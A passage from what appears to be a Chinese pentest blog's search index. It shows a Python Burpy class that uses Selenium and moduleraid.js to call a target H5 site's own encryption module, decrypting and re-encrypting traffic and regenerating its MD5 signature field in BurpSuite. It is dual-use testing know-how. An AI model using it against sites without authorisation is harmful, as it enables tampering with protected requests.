class="string">&#x27;&#x27;</span></span><br><span class="line">        self.k2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self.k3 = <span class="string">&#x27; h5 &#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            js = self._load_js()</span><br><span class="line">            self.driver.execute_script(js)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Failed to load MouldueRaid JS&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__del__</span>(<span class="params">self</span>):</span><br><span class="line">        self.driver.quit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_load_js</span>(<span class="params">self</span>):</span><br><span class="line">        jsFilePath = <span class="string">r&quot;/home/m0nst3r/tools/moduleraid.js&quot;</span></span><br><span class="line">        <span class="comment"># jsFilePath = &quot;E://moduleraid.js&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(jsFilePath) <span class="keyword">as</span> f:</span><br><span class="line">            jsContent = f.read()</span><br><span class="line">        <span class="keyword">return</span> jsContent</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, header, body</span>):</span><br><span class="line">        bodyjson = json.loads(body)</span><br><span class="line">        self.k1 = bodyjson.get(<span class="string">&#x27;K1&#x27;</span>)</span><br><span class="line">        self.k2 = bodyjson.get(<span class="string">&#x27;K2&#x27;</span>)</span><br><span class="line">        DecRes = <span class="string">&quot;&quot;&quot;return window.mR.findModule(&#x27;encrypt&#x27;)[0].decrypt(atob(&#x27;%s&#x27;))&quot;&quot;&quot;</span> % (self.k1)</span><br><span class="line">        result = self.driver.execute_script(DecRes)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Dec Res: &quot;</span>, result)</span><br><span class="line">        nbody = result</span><br><span class="line">        <span class="keyword">return</span> header, nbody</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, header, body</span>):</span><br><span class="line">        EncRes = <span class="string">&quot;&quot;&quot;return btoa(window.mR.findModule(&#x27;encrypt&#x27;)[0].encrypt(&#x27;%s&#x27;));&quot;&quot;&quot;</span> % (body)</span><br><span class="line">        result = self.driver.execute_script(EncRes)</span><br><span class="line">        e = result + result[<span class="number">0</span>:<span class="number">2</span>] + result[<span class="built_in">int</span>(<span class="built_in">len</span>(result)/<span class="number">2</span>)] + result[-<span class="number">2</span>:]</span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        m.update(e.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        self.k2 = m.hexdigest()</span><br><span class="line">        resjson = &#123;&#125;</span><br><span class="line">        resjson.update(&#123;<span class="string">&quot;K1&quot;</span>:result&#125;)</span><br><span class="line">        resjson.update(&#123;<span class="string">&quot;K2&quot;</span>:self.k2&#125;)</span><br><span class="line">        resjson.update(&#123;<span class="string">&quot;K3&quot;</span>:self.k3&#125;)</span><br><span class="line">        res = json.dumps(resjson)</span><br><span class="line">        res = res.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Enc Res: &quot;</span>, res)</span><br><span class="line">        <span class="keyword">return</span> header, res</span><br></pre></td></tr></table></figure>

<p>代码就是最好的注释了。</p>
<blockquote>
<p>使用selenium和webdriver的环境搭建就不多说了，很简单。值得注意的是，如果把webdriver初始化的方法放到函数中，会在BurpSuite中出现卡顿的现象，因为webdriver启动加载我们指定的URL时需要时间，把这个初始化过程放到类的<code>__init__</code>函数中，在<code>start server</code>时会卡几秒，之后就会非常流畅。（这也是Burpy脚本要写成Python类的主要原因）</p>
</blockquote>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>点击解密：<br><img src="/pentest/%E9%AB%98%E6%95%88%E5%A4%84%E7%90%86H5%E7%AB%99%E7%82%B9%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86/2020-12-29-16-31-12.png"></p>
<p>点击加密：<br><img src="/pentest/%E9%AB%98%E6%95%88%E5%A4%84%E7%90%86H5%E7%AB%99%E7%82%B9%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86/2020-12-29-16-32-29.png"></p>
<p>自动加解密：<br>打开这个开关：<br><img src="/pentest/%E9%AB%98%E6%95%88%E5%A4%84%E7%90%86H5%E7%AB%99%E7%82%B9%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86/2020-12-29-16-38-00.png"><br>OJBK：<br><img src="/pentest/%E9%AB%98%E6%95%88%E5%A4%84%E7%90%86H5%E7%AB%99%E7%82%B9%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86/2020-12-29-16-35-38.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>到此，加密的流量变成了明文，妈妈再也不用担心我无法进行渗透测试了！</p>
]]></content>
      <categories>
        <category>pentest</category>
      </categories>
      <tags>
        <tag>burpsuite</tag>
        <tag>burpy</tag>
      </tags>
  </entry>
</search>
